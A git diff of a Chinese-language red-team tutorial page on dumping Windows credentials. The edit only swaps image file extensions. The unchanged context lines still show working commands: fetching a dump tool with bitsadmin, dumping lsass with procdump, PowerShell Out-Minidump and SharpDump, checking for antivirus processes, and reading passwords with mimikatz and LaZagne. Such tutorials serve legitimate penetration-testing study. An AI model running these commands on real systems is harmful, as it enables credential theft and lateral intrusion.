@@ -8,7 +8,7 @@
 query user
 ```
 
-![](<../../.gitbook/assets/image (292).png>)
+![](<../../.gitbook/assets/image (292).webp>)
 
 ## 2、Prodump
 
@@ -22,7 +22,7 @@ bitsadmin /rawreturn /transfer getfile https://raw.githubusercontent.com/klionse
 dump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-![](<../../.gitbook/assets/image (562).png>)
+![](<../../.gitbook/assets/image (562).webp>)
 
 接着,再在本地用 mimikatz.exe 去加载读取即可\[版本保持一致]
 
@@ -30,7 +30,7 @@ dump.exe -accepteula -ma lsass.exe lsass.dmp
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 ```
 
-![](<../../.gitbook/assets/image (794).png>)
+![](<../../.gitbook/assets/image (794).webp>)
 
 ## 3、powershell
 
@@ -46,7 +46,7 @@ tasklist | findstr /c:"egui.exe" /c:"ekrn.exe"
 dir c:\windows\Temp | findstr "lsass
 ```
 
-![](<../../.gitbook/assets/image (324).png>)
+![](<../../.gitbook/assets/image (324).webp>)
 
 同样,之后只需把 lsass\_504.dmp 文件拖到本地机器再用 mimikatz.exe 加载读取即可
 
@@ -54,7 +54,7 @@ dir c:\windows\Temp | findstr "lsass
 mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" exit
 ```
 
-![](<../../.gitbook/assets/image (301).png>)
+![](<../../.gitbook/assets/image (301).webp>)
 
 ### 2、本地执行
 
@@ -62,7 +62,7 @@ mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" 
 powershell –exec bypass –Command "& {Import-Module 'C:\Tools\Out-Minidump.ps1'; Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp}"
 ```
 
-![](<../../.gitbook/assets/image (596).png>)
+![](<../../.gitbook/assets/image (596).webp>)
 
 PS: powershell 导 lsass.exe 进程数据差不多文件要比用 prodump 导的小 10M 左右
 
@@ -70,7 +70,7 @@ PS: powershell 导 lsass.exe 进程数据差不多文件要比用 prodump 导的
 mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" exit
 ```
 
-![](<../../.gitbook/assets/image (732).png>)
+![](<../../.gitbook/assets/image (732).webp>)
 
 ## 4、sharpDump
 
@@ -82,11 +82,11 @@ mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" 
 %SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe E:\SharpDump-master\SharpDump.sln /t:Rebuild /p:Configuration=Release
 ```
 
-![](<../../.gitbook/assets/image (380).png>)
+![](<../../.gitbook/assets/image (380).webp>)
 
 直接运行：
 
-![](<../../.gitbook/assets/image (285).png>)
+![](<../../.gitbook/assets/image (285).webp>)
 
 需要线把 bin 重命名为 zip 后缀,然后正常解压出里面的 文件,再给 mimikatz 去读取即可
 
@@ -94,7 +94,7 @@ mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" 
 mimikatz.exe "sekurlsa::minidump debug596" "sekurlsa::logonPasswords full" "exit"
 ```
 
-![](<../../.gitbook/assets/image (353).png>)
+![](<../../.gitbook/assets/image (353).webp>)
 
 ## 5、LaZagne(python)
 
@@ -102,7 +102,7 @@ mimikatz.exe "sekurlsa::minidump debug596" "sekurlsa::logonPasswords full" "exit
 
 下载直接运行`lazgne.exe all`
 
-![](<../../.gitbook/assets/image (266).png>)
+![](<../../.gitbook/assets/image (266).webp>)
 
-![](<../../.gitbook/assets/image (314).png>)
+![](<../../.gitbook/assets/image (314).webp>)
 
